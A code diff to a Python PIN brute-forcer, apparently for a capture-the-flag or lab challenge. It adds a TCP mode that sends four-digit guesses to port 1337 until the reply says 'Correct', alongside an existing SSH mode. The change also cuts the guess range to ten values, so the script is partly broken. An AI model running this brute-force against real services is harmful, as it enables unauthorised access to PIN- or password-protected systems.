@@ -65,22 +65,54 @@ def ssh_connect():
         print(e)
 
 
+def tcp_connect():
+
+    port = 1337
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host, port))
+
+    # loop the range of numbers
+    for i in range(num):
+        # format the int to have 4 digits always
+        guess = '{0:04}'.format(i) + '\n'
+        print(green + 'Guessing {0}... '.format(guess) + end_color)
+        # Send the guess
+        s.send(guess.encode())
+        # get the response
+        data = s.recv(1024)
+        print(data)
+        # If we see "Correct" we are done
+        if 'Correct' in data.decode():
+            print(green + "Winner is {0}".format(guess) + end_color)
+            s.close()
+            quit()
+        print(red + data.decode() + end_color)
+
+    s.close()
+
+
 if __name__ == '__main__':
-    if len(sys.argv) != 2:
-        print('Usage: python3 ' + sys.argv[0] + ' host')
+    if len(sys.argv) != 3:
+        print('Usage: python3 ' + sys.argv[0] + ' host mode')
+        print('Mode is tcp or ssh')
+        print('Example ' + sys.argv[0] + ' 127.0.0.1 tcp')
         sys.exit(0)
 
     # Declare some colors to use
     green = '\033[92m'
     yellow = '\033[93m'
     red = '\033[91m'
-    blue = '\033[94m'
-    end_color = '\033[0m'
-
-    # Assign arguments to more meaningful variables
+    blue = '\033[94m'  # Assign arguments to more meaningful variables
     host = sys.argv[1]
+    mode = sys.argv[2]
 
     # Pin to brute force range
-    num = 10000
+    num = 10
+    end_color = '\033[0m'
 
-    ssh_connect()
+    if 'ssh' in mode:
+        ssh_connect()
+    elif 'tcp' in mode:
+        tcp_connect()
+
